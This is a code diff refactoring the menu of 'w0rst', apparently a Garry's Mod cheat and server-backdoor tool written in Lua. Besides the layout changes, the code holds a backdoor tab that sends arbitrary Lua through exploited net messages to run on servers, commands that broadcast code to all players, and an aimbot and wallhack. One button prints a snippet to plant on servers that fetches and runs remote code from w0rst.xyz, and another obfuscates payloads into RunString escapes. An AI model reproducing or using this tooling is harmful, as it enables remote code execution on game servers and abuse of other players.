@@ -115,6 +115,7 @@ function wtf.SendLua(lua)
 end
 
 wtf.Icons = { V="https://w0rst.xyz/script/images/visuals.png", P="https://w0rst.xyz/script/images/players.png", B="https://w0rst.xyz/script/images/backdoor.png", M="https://w0rst.xyz/script/images/misc.png", S="https://w0rst.xyz/script/images/sounds.png" }
+wtf.Materials = {}
 
 function wtf.Download(filename, url, callback, errorCallback)
     local path = "w0rst/images/" .. filename
@@ -139,73 +140,44 @@ function wtf.IconSet(iconUrls, path, cb)
 
     for name, url in pairs(iconUrls) do
         wtf.Download((path or "") .. util.CRC(name .. url) .. "." .. string.GetExtensionFromFilename(url), url, function(path)
-            set[name] = Material(path, "unlitgeneric")
-            count = count + 1
-        if (count == iconAmt and cb) then
-            cb(set)
-        end
+            set[name] = Material(path, "unlitgeneric"); count = count + 1
+        if (count == iconAmt and cb) then cb(set) end
     end)
 end return set
 end
 
 function wtf.Map(tbl, fn)
-	local new = {}
-	for k, v in pairs(tbl) do
-		new[k] = fn(v, k, tbl)
+  	local new = {}
+  	for k, v in pairs(tbl) do
+    		new[k] = fn(v, k, tbl)
     end return new
 end
 
-wtf.Materials = {}
 wtf.Materials = wtf.IconSet(wtf.Icons, "")
-
 wtf.IconSet(wtf.Map(wtf.Icons, function(v) return end), "",
-function(icons)
-    for k, icon in pairs(icons) do
-        wtf.Icons[k].iconMat = icon
-    end
-end)
+function(icons) for k, icon in pairs(icons) do wtf.Icons[k].iconMat = icon end end)
 
 surface.CreateFont('Font', {
-    font = 'Open Sans',
-    extended = false,
-    size = 20,
-    weight = 1000,
-    blursize = 0,
-    scanlines = 0,
-    antialias = true,
-    underline = false,
-    italic = false,
-    strikeout = false,
-    symbol = false,
-    rotary = false,
-    shadow = true,
-    additive = false,
-    outline = false,
+    font = 'Open Sans', extended = false, size = 20,
+    weight = 1000, blursize = 0, scanlines = 0,
+    antialias = true, underline = false, italic = false,
+    strikeout = false, symbol = false, rotary = false,
+    shadow = true, additive = false, outline = false,
 })
 
 surface.CreateFont('Sounds', {
-    font = 'Marlett',
-    extended = false,
-    size = 17,
-    weight = 1000,
-    blursize = 0,
-    scanlines = 0,
-    antialias = true,
-    underline = false,
-    italic = false,
-    strikeout = false,
-    symbol = false,
-    rotary = false,
-    shadow = true,
-    additive = true,
-    outline = true,
+    font = 'Marlett', extended = false, size = 17,
+    weight = 1000, blursize = 0, scanlines = 0,
+    antialias = true, underline = false, italic = false,
+    strikeout = false, symbol = false, rotary = false,
+    shadow = true, additive = true, outline = true,
 })
 
 function wtf.conoutRGB(str)
 	local text = {}
 	for i = 1, #str do
-		table.insert(text, HSVToColor(i * math.random(2, 10) % 360, 1, 1 ))
-		table.insert(text, string.sub(str, i, i))
+  		table.insert(text, HSVToColor(i * math.random(2, 10) % 360, 1, 1 ))
+  		table.insert(text, string.sub(str, i, i))
 	end
 
 	table.insert(text, "\n")
@@ -283,74 +255,44 @@ Background:SetPos(150, 90)
 Background:SetSize(490,390)
 Background:SetHTML([[<img src='https://i.imgur.com/OMKLFDr.png' alt='Img' style='width:300px;height:300px;'>]])
 
-local TabVisuals=vgui.Create("DFrame", Tab)
-TabVisuals:ShowCloseButton(false)
-TabVisuals:SetVisible(false)
-TabVisuals:SetDraggable(false)
-TabVisuals:SetTitle("")
-TabVisuals:SetSize(515, 560)
-TabVisuals:SetPos(95, 10)
-TabVisuals.Paint = function(self, w, h)
-    draw.RoundedBox(0,0,0,w,h,Color(30,30,30,255))
-    surface.SetDrawColor(Color(15,15,15,255))
-    surface.DrawOutlinedRect(0,0,self:GetWide(),self:GetTall())
+local Tabs, TabButtons = {}, {}
+local function CreateTabButton(mat, x, y)
+    local btn, tab = wtf.gString(math.random(10, 220)), wtf.gString(math.random(10, 220))
+    TabButtons[btn]=vgui.Create("DButton", Tab)
+    TabButtons[btn]:SetSize(70,70)
+    TabButtons[btn]:SetPos(x, y)
+    TabButtons[btn]:SetText("")
+    TabButtons[btn]:SetMaterial(mat)
+    TabButtons[btn].Paint = function(self, w, h) surface.SetDrawColor(Color(0,0,0)) end
+    TabButtons[btn].DoClick = function()
+        for k, v in pairs(Tabs) do v:Hide() end
+        if Tabs[tab]:IsVisible() then Tabs[tab]:Hide()
+        else Tabs[tab]:Show() end
+    end
+
+    Tabs[tab] = vgui.Create("DFrame", Tab)
+    Tabs[tab]:ShowCloseButton(false)
+    Tabs[tab]:SetVisible(false)
+    Tabs[tab]:SetDraggable(false)
+    Tabs[tab]:SetTitle("")
+    Tabs[tab]:SetSize(515, 560)
+    Tabs[tab]:SetPos(95, 10)
+    Tabs[tab].Paint = function(self, w, h)
+        draw.RoundedBox(0,0,0,w,h,Color(30,30,30,255))
+        surface.SetDrawColor(Color(15,15,15,255))
+        surface.DrawOutlinedRect(0,0,self:GetWide(),self:GetTall())
+    end
+
+    return { Tabs[tab], TabButtons[btn] }
 end
 
-local TabPlayers=vgui.Create("DFrame", Tab)
-TabPlayers:ShowCloseButton(false)
-TabPlayers:SetVisible(false)
-TabPlayers:SetDraggable(false)
-TabPlayers:SetTitle("")
-TabPlayers:SetSize(515, 560)
-TabPlayers:SetPos(95, 10)
-TabPlayers.Paint = function(self, w, h)
-    draw.RoundedBox(0,0,0,w,h,Color(30,30,30,255))
-    surface.SetDrawColor(Color(15,15,15,255))
-    surface.DrawOutlinedRect(0,0,self:GetWide(),self:GetTall())
-end
+local VisualsTab = CreateTabButton(wtf.Materials.V, 13, 5)
+local MiscTab = CreateTabButton(wtf.Materials.M, 13, 85)
+local PlayersTab = CreateTabButton(wtf.Materials.P, 13, 165)
+local BackdoorTab = CreateTabButton(wtf.Materials.B, 13, 245)
+local SoundsTab = CreateTabButton(wtf.Materials.S, 13, 325)
 
-local TabBackdoor=vgui.Create("DFrame", Tab)
-TabBackdoor:ShowCloseButton(false)
-TabBackdoor:SetVisible(false)
-TabBackdoor:SetDraggable(false)
-TabBackdoor:SetTitle("")
-TabBackdoor:SetSize(515, 560)
-TabBackdoor:SetPos(95, 10)
-TabBackdoor.Paint = function(self, w, h)
-    draw.RoundedBox(0,0,0,w,h,Color(30,30,30,255))
-    surface.SetDrawColor(Color(15,15,15,255))
-    surface.DrawOutlinedRect(0,0,self:GetWide(),self:GetTall())
-    draw.SimpleText("Client", "Font", 355, 7, Color(255,255,255,255))
-    draw.SimpleText("Server", "Font", 105, 7, Color(255,255,255,255))
-end
-
-local TabSounds=vgui.Create("DFrame", Tab)
-TabSounds:ShowCloseButton(false)
-TabSounds:SetVisible(false)
-TabSounds:SetDraggable(false)
-TabSounds:SetTitle("")
-TabSounds:SetSize(515, 560)
-TabSounds:SetPos(95, 10)
-TabSounds.Paint = function(self, w, h)
-    draw.RoundedBox(0,0,0,w,h,Color(30,30,30,255))
-    surface.SetDrawColor(Color(15,15,15,255))
-    surface.DrawOutlinedRect(0,0,self:GetWide(),self:GetTall())
-end
-
-local TabMisc=vgui.Create("DFrame", Tab)
-TabMisc:ShowCloseButton(false)
-TabMisc:SetVisible(false)
-TabMisc:SetDraggable(false)
-TabMisc:SetTitle("")
-TabMisc:SetSize(515, 560)
-TabMisc:SetPos(95, 10)
-TabMisc.Paint = function(self, w, h)
-    draw.RoundedBox(0,0,0,w,h,Color(30,30,30,255))
-    surface.SetDrawColor(Color(15,15,15,255))
-    surface.DrawOutlinedRect(0,0,self:GetWide(),self:GetTall())
-end
-
-local LuaEditor=vgui.Create("DTextEntry", TabBackdoor)
+local LuaEditor=vgui.Create("DTextEntry", BackdoorTab[1])
 LuaEditor:SetPos(10, 325)
 LuaEditor:AllowInput()
 LuaEditor:SetSize(495, 185)
@@ -361,42 +303,6 @@ LuaEditor.Paint = function(self, w, h)
     surface.DrawOutlinedRect(0, 0, w, h)
     self:DrawTextEntryText(Color(255, 255, 255), Color(20, 20, 150), Color(100, 100, 100))
     self:SetFont('Trebuchet18')
-end
-
-local function CreateTabButton(show, mat, x, y)
-    Button=vgui.Create("DButton", Tab)
-    Button:SetSize(70,70)
-    Button:SetPos(x, y)
-    Button:SetText("")
-    Button:SetMaterial(mat)
-    Button.Paint = function(self, w, h) surface.SetDrawColor(Color(0,0,0)) end
-    Button.DoClick = function()
-        if(show == TabVisuals) then
-            show:SetVisible(true); Background:SetVisible(false)
-            TabPlayers:SetVisible(false); TabBackdoor:SetVisible(false);
-            TabSounds:SetVisible(false); TabMisc:SetVisible(false);
-        end
-        if(show == TabPlayers) then
-            show:SetVisible(true); Background:SetVisible(false)
-            TabVisuals:SetVisible(false); TabBackdoor:SetVisible(false);
-            TabSounds:SetVisible(false); TabMisc:SetVisible(false);
-        end
-        if(show == TabBackdoor) then
-            show:SetVisible(true); Background:SetVisible(false)
-            TabPlayers:SetVisible(false); TabVisuals:SetVisible(false);
-            TabSounds:SetVisible(false); TabMisc:SetVisible(false);
-        end
-        if(show == TabSounds) then
-            show:SetVisible(true); Background:SetVisible(false)
-            TabPlayers:SetVisible(false); TabBackdoor:SetVisible(false);
-            TabVisuals:SetVisible(false); TabMisc:SetVisible(false);
-        end
-        if(show == TabMisc) then
-            show:SetVisible(true); Background:SetVisible(false)
-            TabPlayers:SetVisible(false); TabBackdoor:SetVisible(false);
-            TabSounds:SetVisible(false); TabVisuals:SetVisible(false);
-        end
-    end return { Button }
 end
 
 local function CreatePanel(tab, width, height, x, y)
@@ -427,11 +333,11 @@ local function CreateButton(name, tab, width, height, x, y, func)
 end
 
 --/ init panels for later functions
-local PlayerPanel=CreatePanel(TabPlayers, 495, 540, 10, 10)
-local EntityPanel=CreatePanel(TabVisuals, 490, 350, 15, 190)
-local SoundPanel=CreatePanel(TabSounds, 495, 505, 10, 10)
-local ServerBDPanel=CreatePanel(TabBackdoor, 225, 280, 20, 35)
-local ClientBDPanel=CreatePanel(TabBackdoor, 225, 280, 270, 35)
+local PlayerPanel=CreatePanel(PlayersTab[1], 495, 540, 10, 10)
+local EntityPanel=CreatePanel(VisualsTab[1], 490, 350, 15, 190)
+local SoundPanel=CreatePanel(SoundsTab[1], 495, 505, 10, 10)
+local ServerBDPanel=CreatePanel(BackdoorTab[1], 225, 280, 20, 35)
+local ClientBDPanel=CreatePanel(BackdoorTab[1], 225, 280, 270, 35)
 
 local function CreateBDServer(name, func)
     Button=vgui.Create("DButton", ServerBDPanel[1])
@@ -439,11 +345,8 @@ local function CreateBDServer(name, func)
     Button:SetPos(15, BDServerPosY)
     Button:SetText(name)
     Button.DoClick = function()
-        if SelectedNet ~= "NONE" then
-            func()
-        else
-            wtf.Log("No Net Selected")
-        end
+        if SelectedNet ~= "NONE" then func()
+        else wtf.Log("No Net Selected") end
     end
     Button.Paint = function(self, w,h)
         draw.RoundedBox(0,0,0,self:GetWide(),self:GetTall(),Color(35, 35, 35, 255))
@@ -752,31 +655,17 @@ function RefreshEntList()
     end
 end; RefreshEntList()
 
-local TabButtonVisuals=CreateTabButton(TabVisuals, wtf.Materials.V, 13, 5)
-local TabButtonMisc=CreateTabButton(TabMisc, wtf.Materials.M, 13, 85)
-local TabButtonPlayers=CreateTabButton(TabPlayers, wtf.Materials.P, 13, 165)
-local TabButtonBackdoor=CreateTabButton(TabBackdoor, wtf.Materials.B, 13, 245)
-local TabButtonSounds=CreateTabButton(TabSounds, wtf.Materials.S, 13, 325)
-
-timer.Simple(7.5, function()
-    TabButtonVisuals[1]:SetMaterial(wtf.Materials.V)
-    TabButtonPlayers[1]:SetMaterial(wtf.Materials.P)
-    TabButtonBackdoor[1]:SetMaterial(wtf.Materials.B)
-    TabButtonSounds[1]:SetMaterial(wtf.Materials.S)
-    TabButtonMisc[1]:SetMaterial(wtf.Materials.M)
-end)
-
-local TracerSlider = CreateColorSlider("Tracer-Editor", TracerColor, TabMisc, 9, 280)
-local DistanceSlider = CreateColorSlider("Distance-Editor", DistanceColor, TabMisc, 134, 280)
-local NameSlider = CreateColorSlider("Name-Editor", NameColor, TabMisc, 259, 280)
-local WeaponSlider = CreateColorSlider("Weapon-Editor", WeaponColor, TabMisc, 384, 280)
-local Box2DSlider = CreateColorSlider("Box-2D-Editor", Box2DColor, TabMisc,  9, 370)
-local Box3DSlider = CreateColorSlider("Box-3D-Editor", Box3DColor, TabMisc, 134, 370)
-local SkeletonSlider = CreateColorSlider("Skeleton-Editor", SkeletonColor, TabMisc, 259, 370)
-local ChamsSlider = CreateColorSlider("Chams-Editor", ChamsColor, TabMisc, 384, 370)
-local EntitySlider = CreateColorSlider("Entity-Editor", EntityColor, TabMisc, 9, 460)
-local FovSlider = CreateColorSlider("Fov-Editor", FovColor, TabMisc, 134, 460)
-local NameDistSlider = CreateColorSlider("Name/Dist-Editor", NameDistColor, TabMisc, 259, 460)
+local TracerSlider = CreateColorSlider("Tracer-Editor", TracerColor, MiscTab[1], 9, 280)
+local DistanceSlider = CreateColorSlider("Distance-Editor", DistanceColor, MiscTab[1], 134, 280)
+local NameSlider = CreateColorSlider("Name-Editor", NameColor, MiscTab[1], 259, 280)
+local WeaponSlider = CreateColorSlider("Weapon-Editor", WeaponColor, MiscTab[1], 384, 280)
+local Box2DSlider = CreateColorSlider("Box-2D-Editor", Box2DColor, MiscTab[1],  9, 370)
+local Box3DSlider = CreateColorSlider("Box-3D-Editor", Box3DColor, MiscTab[1], 134, 370)
+local SkeletonSlider = CreateColorSlider("Skeleton-Editor", SkeletonColor, MiscTab[1], 259, 370)
+local ChamsSlider = CreateColorSlider("Chams-Editor", ChamsColor, MiscTab[1], 384, 370)
+local EntitySlider = CreateColorSlider("Entity-Editor", EntityColor, MiscTab[1], 9, 460)
+local FovSlider = CreateColorSlider("Fov-Editor", FovColor, MiscTab[1], 134, 460)
+local NameDistSlider = CreateColorSlider("Name/Dist-Editor", NameDistColor, MiscTab[1], 259, 460)
 
 local FC={}
 FC.Enabled=false
@@ -1119,17 +1008,17 @@ hook.Add("Think", KeyHook, function()
     end
 end)
 
-CreateButton("Refresh Ents", TabVisuals, 80, 25, 45, 160, function()
+CreateButton("Refresh Ents", VisualsTab[1], 80, 25, 45, 160, function()
     RefreshEntList()
 end)
 
-CreateButton("Add Ent", TabVisuals, 80, 25, 130, 160, function()
+CreateButton("Add Ent", VisualsTab[1], 80, 25, 130, 160, function()
   if EntOffList:GetSelectedLine() ~= nil then
       table.insert( EntList, EntOffList:GetLine(EntOffList:GetSelectedLine()):GetValue(1) )
   end; RefreshEntList()
 end)
 
-CreateButton("Remove Ent", TabVisuals, 80, 25, 215, 160, function()
+CreateButton("Remove Ent", VisualsTab[1], 80, 25, 215, 160, function()
     if EntOnList:GetSelectedLine() ~= nil then
         for k, v in pairs( EntList ) do
             if v == EntOnList:GetLine(EntOnList:GetSelectedLine()):GetValue(1) then
@@ -1139,18 +1028,18 @@ CreateButton("Remove Ent", TabVisuals, 80, 25, 215, 160, function()
     end; RefreshEntList()
 end)
 
-CreateButton("Add All", TabVisuals, 80, 25, 300, 160, function()
+CreateButton("Add All", VisualsTab[1], 80, 25, 300, 160, function()
   for k, v in pairs( EntOffList:GetLines() ) do
       table.insert( EntList, v:GetValue(1) )
   end; RefreshEntList()
 end)
 
-CreateButton("Remove All", TabVisuals, 80, 25, 385, 160, function()
+CreateButton("Remove All", VisualsTab[1], 80, 25, 385, 160, function()
   table.Empty( EntList )
   RefreshEntList()
 end)
 
-CreateCheckbox("Plr-Tracer", TabVisuals, 22, 10, function()
+CreateCheckbox("Plr-Tracer", VisualsTab[1], 22, 10, function()
     TracerEnable=not TracerEnable
     if(TracerEnable == false) then
         wtf.Log("Tracer Disabled")
@@ -1159,7 +1048,7 @@ CreateCheckbox("Plr-Tracer", TabVisuals, 22, 10, function()
     end
 end)
 
-CreateCheckbox("Plr-Distance", TabVisuals, 142, 10, function()
+CreateCheckbox("Plr-Distance", VisualsTab[1], 142, 10, function()
     DistanceEnable=not DistanceEnable
     if(DistanceEnable == false) then
         wtf.Log("Distance Disabled")
@@ -1168,7 +1057,7 @@ CreateCheckbox("Plr-Distance", TabVisuals, 142, 10, function()
     end
 end)
 
-CreateCheckbox("Plr-Names", TabVisuals, 262, 10, function()
+CreateCheckbox("Plr-Names", VisualsTab[1], 262, 10, function()
     NameEnable=not NameEnable
     if(NameEnable == false) then
         wtf.Log("Name Disabled")
@@ -1177,7 +1066,7 @@ CreateCheckbox("Plr-Names", TabVisuals, 262, 10, function()
     end
 end)
 
-CreateCheckbox("Plr-Weapons", TabVisuals, 382, 10, function()
+CreateCheckbox("Plr-Weapons", VisualsTab[1], 382, 10, function()
     WeaponEnable=not WeaponEnable
     if(WeaponEnable == false) then
         wtf.Log("Weapon Disabled")
@@ -1186,7 +1075,7 @@ CreateCheckbox("Plr-Weapons", TabVisuals, 382, 10, function()
     end
 end)
 
-CreateCheckbox("Plr-2D-Box", TabVisuals, 22, 40, function()
+CreateCheckbox("Plr-2D-Box", VisualsTab[1], 22, 40, function()
     Box2DEnable=not Box2DEnable
     if(Box2DEnable == false) then
         wtf.Log("Box-2D Disabled")
@@ -1195,7 +1084,7 @@ CreateCheckbox("Plr-2D-Box", TabVisuals, 22, 40, function()
     end
 end)
 
-CreateCheckbox("Plr-3D-Box", TabVisuals, 142, 40, function()
+CreateCheckbox("Plr-3D-Box", VisualsTab[1], 142, 40, function()
     Box3DEnable=not Box3DEnable
     if(Box3DEnable == false) then
         wtf.Log("Box-3D Disabled")
@@ -1204,7 +1093,7 @@ CreateCheckbox("Plr-3D-Box", TabVisuals, 142, 40, function()
     end
 end)
 
-CreateCheckbox("Plr-Skeletons", TabVisuals, 262, 40, function()
+CreateCheckbox("Plr-Skeletons", VisualsTab[1], 262, 40, function()
     SkeletonEnable=not SkeletonEnable
     if(SkeletonEnable == false) then
         wtf.Log("Skeleton Disabled")
@@ -1213,7 +1102,7 @@ CreateCheckbox("Plr-Skeletons", TabVisuals, 262, 40, function()
     end
 end)
 
-CreateCheckbox("Plr-Chams", TabVisuals, 382, 40, function()
+CreateCheckbox("Plr-Chams", VisualsTab[1], 382, 40, function()
     ChamsEnable=not ChamsEnable
     if(ChamsEnable == false) then
         wtf.Log("Chams Disabled")
@@ -1222,7 +1111,7 @@ CreateCheckbox("Plr-Chams", TabVisuals, 382, 40, function()
     end
 end)
 
-CreateCheckbox("Ent-Names", TabVisuals, 22, 70, function()
+CreateCheckbox("Ent-Names", VisualsTab[1], 22, 70, function()
   EntNameEnable=not EntNameEnable
   if(EntNameEnable == false) then
       wtf.Log("Entity Names Disabled")
@@ -1231,7 +1120,7 @@ CreateCheckbox("Ent-Names", TabVisuals, 22, 70, function()
   end
 end)
 
-CreateCheckbox("Ent-Distance", TabVisuals, 142, 70, function()
+CreateCheckbox("Ent-Distance", VisualsTab[1], 142, 70, function()
   EntDistanceEnable=not EntDistanceEnable
   if(EntDistanceEnable == false) then
       wtf.Log("Entity Distance Disabled")
@@ -1240,7 +1129,7 @@ CreateCheckbox("Ent-Distance", TabVisuals, 142, 70, function()
   end
 end)
 
-CreateCheckbox("Ent-3D (D)", TabVisuals, 262, 70, function()
+CreateCheckbox("Ent-3D (D)", VisualsTab[1], 262, 70, function()
   Ent3DEnable=not Ent3DEnable
   if(Ent3DEnable == false) then
       wtf.Log("Entity 3D-Boxes Disabled")
@@ -1249,7 +1138,7 @@ CreateCheckbox("Ent-3D (D)", TabVisuals, 262, 70, function()
   end
 end)
 
-CreateCheckbox("Wallhack", TabVisuals, 382, 70, function()
+CreateCheckbox("Wallhack", VisualsTab[1], 382, 70, function()
     WallhackEnable=not WallhackEnable
     if(WallhackEnable == false) then
         wtf.Log("Wallhack Disabled")
@@ -1258,7 +1147,7 @@ CreateCheckbox("Wallhack", TabVisuals, 382, 70, function()
     end
 end)
 
-CreateCheckbox("Free Camera", TabVisuals, 22, 100, function()
+CreateCheckbox("Free Camera", VisualsTab[1], 22, 100, function()
     FC.Enabled=not FC.Enabled
     if FC.Enabled then
         wtf.Log("Freecam Enabled")
@@ -1269,7 +1158,7 @@ CreateCheckbox("Free Camera", TabVisuals, 22, 100, function()
     FC.SetView=true
 end)
 
-CreateButton("Save Visuals", TabMisc, 110, 25, 395, 250, function()
+CreateButton("Save Visuals", MiscTab[1], 110, 25, 395, 250, function()
     local tc = TracerColor.r.." "..TracerColor.g.." "..TracerColor.b
     local dc = DistanceColor.r.." "..DistanceColor.g.." "..DistanceColor.b
     local nc = NameColor.r.." "..NameColor.g.." "..NameColor.b
@@ -1286,7 +1175,7 @@ CreateButton("Save Visuals", TabMisc, 110, 25, 395, 250, function()
     file.Write("w0rst/visuals.txt", tc..","..dc..","..nc..","..wc..","..bc..","..sc..","..dbc..","..cc..","..ec..","..fc..","..ndc)
 end)
 
-CreateButton("Load Visuals", TabMisc, 110, 25, 280, 250, function()
+CreateButton("Load Visuals", MiscTab[1], 110, 25, 280, 250, function()
     if not file.Exists("w0rst/visuals.txt", "DATA") then
         wtf.Log("File Not Found"); wtf.conoutRGB("VISUALS FILE NOT FOUND")
     else
@@ -1775,11 +1664,11 @@ CreateBDClient("Explode Player", function()
     end
 end)
 
-CreateButton("Net-Scan", TabBackdoor, 115, 30, 19, 520, function()
+CreateButton("Net-Scan", BackdoorTab[1], 115, 30, 19, 520, function()
     wtf.CheckWebNets()
 end)
 
-CreateButton("Select-Net", TabBackdoor, 115, 30, 139, 520, function()
+CreateButton("Select-Net", BackdoorTab[1], 115, 30, 139, 520, function()
     Derma_StringRequest("Select Net", "Net To Select:", "", function(str)
         if wtf.CheckNet(str) then
             SelectedNet=str
@@ -1792,13 +1681,13 @@ CreateButton("Select-Net", TabBackdoor, 115, 30, 139, 520, function()
     end)
 end)
 
-CreateButton("Add-Net", TabBackdoor, 115, 30, 259, 520, function()
+CreateButton("Add-Net", BackdoorTab[1], 115, 30, 259, 520, function()
     Derma_StringRequest("Add Net | Staff Use Only", "Net To Add:", "", function(str)
         wtf.AddNet(str)
     end)
 end)
 
-CreateButton("Run Lua", TabBackdoor, 115, 30, 379, 520, function()
+CreateButton("Run Lua", BackdoorTab[1], 115, 30, 379, 520, function()
     if(SelectedNet ~= "NONE") then
         _G.net.Start(SelectedNet)
         _G.net.WriteString(LuaEditor:GetValue())
@@ -1809,7 +1698,7 @@ CreateButton("Run Lua", TabBackdoor, 115, 30, 379, 520, function()
     end
 end)
 
-CreateButton("Adv-Bhop", TabMisc, 110, 25, 20, 10, function()
+CreateButton("Adv-Bhop", MiscTab[1], 110, 25, 20, 10, function()
     if(BhopEnable == false) then
         wtf.Log("Bhop Enabled")
         hook.Add("CreateMove", BhopHook, function(ply) wtf.bhop_loop(ply) end);
@@ -1821,7 +1710,7 @@ CreateButton("Adv-Bhop", TabMisc, 110, 25, 20, 10, function()
     end
 end)
 
-CreateButton("Net-Dumper", TabMisc, 110, 25, 140, 10, function()
+CreateButton("Net-Dumper", MiscTab[1], 110, 25, 140, 10, function()
     local name = "w0rst/netstrings".."_"..math.random(10^5,10^10)..".txt"
     if file.Exists(name, "DATA") then
         file.Delete(name)
@@ -1841,12 +1730,12 @@ CreateButton("Net-Dumper", TabMisc, 110, 25, 140, 10, function()
     wtf.conoutRGB("NET DUMP LOCATION: GarrysMod\\garrysmod\\data\\"..name)
 end)
 
-CreateButton("W0RST-BD | Method", TabMisc, 110, 25, 260, 10, function()
+CreateButton("W0RST-BD | Method", MiscTab[1], 110, 25, 260, 10, function()
     MsgC("timer.Simple(5, function() http.Fetch('https://w0rst.xyz/script/napalm', RunString) end)\n")
     wtf.Log("Check Console")
 end)
 
-CreateButton("Rainbow-Physgun", TabMisc, 110, 25, 380, 10, function()
+CreateButton("Rainbow-Physgun", MiscTab[1], 110, 25, 380, 10, function()
     if(RainbowEnable == false) then
         wtf.Log("RGB-Physgun Enabled")
         RainbowEnable=true
@@ -1856,7 +1745,7 @@ CreateButton("Rainbow-Physgun", TabMisc, 110, 25, 380, 10, function()
     end
 end)
 
-CreateButton("Use-Spammer", TabMisc, 110, 25, 20, 40, function()
+CreateButton("Use-Spammer", MiscTab[1], 110, 25, 20, 40, function()
     if(UseSpamEnable == false) then
         wtf.Log("Use Spammer Enabled")
         UseSpamEnable=true
@@ -1870,7 +1759,7 @@ CreateButton("Use-Spammer", TabMisc, 110, 25, 20, 40, function()
     end
 end)
 
-CreateButton("Flash-Spammer", TabMisc, 110, 25, 140, 40, function()
+CreateButton("Flash-Spammer", MiscTab[1], 110, 25, 140, 40, function()
     if(FlashSpamEnable == false) then
         wtf.Log("Flash Spammer Enabled")
         hook.Add("Tick", FSHook , function() LocalPlayer():ConCommand("impulse 100") end)
@@ -1882,14 +1771,14 @@ CreateButton("Flash-Spammer", TabMisc, 110, 25, 140, 40, function()
     end
 end)
 
-CreateButton("FOV-Editor", TabMisc, 110, 25, 260, 40, function()
+CreateButton("FOV-Editor", MiscTab[1], 110, 25, 260, 40, function()
     Derma_StringRequest("Edit Fov", "Set Fov To:", "", function(str)
         LocalPlayer():ConCommand("fov_desired "..str)
         wtf.Log("FOV Set: "..str)
     end)
 end)
 
-CreateButton("Encode-String", TabMisc, 110, 25, 380, 40, function()
+CreateButton("Encode-String", MiscTab[1], 110, 25, 380, 40, function()
     Derma_StringRequest("Encode String", "String To Encode", "", function(str)
         local encoded = str:gsub(".", function(bb) return "\\" .. bb:byte() end)
         wtf.conoutRGB("ENCODED-STRING: ".."RunString("..encoded..")")
@@ -1898,7 +1787,7 @@ CreateButton("Encode-String", TabMisc, 110, 25, 380, 40, function()
       end)
 end)
 
-CreateCheckbox("Chat Advertise", TabMisc, 20, 70, function()
+CreateCheckbox("Chat Advertise", MiscTab[1], 20, 70, function()
     ChatSpamEnable = !ChatSpamEnable
     if(ChatSpamEnable == true) then
         wtf.Log("Chat Advertiser Enabled")
@@ -1907,8 +1796,8 @@ CreateCheckbox("Chat Advertise", TabMisc, 20, 70, function()
     end
 end)
 
-CreateSlider("Fov:", FovCircle, TabMisc, 2200, 5, 260, 70)
-CreateCheckbox("Aimbot L-ALT", TabMisc, 140, 70, function()
+CreateSlider("Fov:", FovCircle, MiscTab[1], 2200, 5, 260, 70)
+CreateCheckbox("Aimbot L-ALT", MiscTab[1], 140, 70, function()
     AimbotEnable = !AimbotEnable
     if(AimbotEnable == false) then
         wtf.Log("Aimbot Disabled")
@@ -1917,7 +1806,7 @@ CreateCheckbox("Aimbot L-ALT", TabMisc, 140, 70, function()
     end
 end)
 
-CreateCheckbox("AntiRecoil", TabMisc, 380, 70, function()
+CreateCheckbox("AntiRecoil", MiscTab[1], 380, 70, function()
     AntiRecoilEnable = !AntiRecoilEnable
     if(AntiRecoilEnable == false) then
         wtf.Log("AntiRecoil Disabled")
@@ -1926,24 +1815,16 @@ CreateCheckbox("AntiRecoil", TabMisc, 380, 70, function()
     end
 end)
 
-CreateButton("Play URL-Link", TabSounds, 120, 35, 385, 520, function()
+CreateButton("Play URL-Link", SoundsTab[1], 120, 35, 385, 520, function()
     Derma_StringRequest("Play URL", "URL:", "", function(str)
         wtf.SendLua([[BroadcastLua("sound.PlayURL(']]..str..[[' , 'mono', function() end)")]])
         wtf.Log("Playing: " .. str)
     end)
 end)
 
-CreateButton("Stop Sounds", TabSounds, 120, 35, 255, 520, function()
+CreateButton("Stop Sounds", SoundsTab[1], 120, 35, 255, 520, function()
     wtf.SendLua([[for k,v in pairs(player.GetAll()) do v:ConCommand('stopsound') end]])
     wtf.Log("Stopped Sounds")
 end)
 
-CreateSoundButtons() --/ creates all sound buttons
-
---## NOTES
---## New Pasted backdoor features
---## Textured Background for menu
---## Third-Person / Any Fov
---## Anti-Screengrab
---## Aimbot Prioritise distance
---## Server Detector
+CreateSoundButtons()
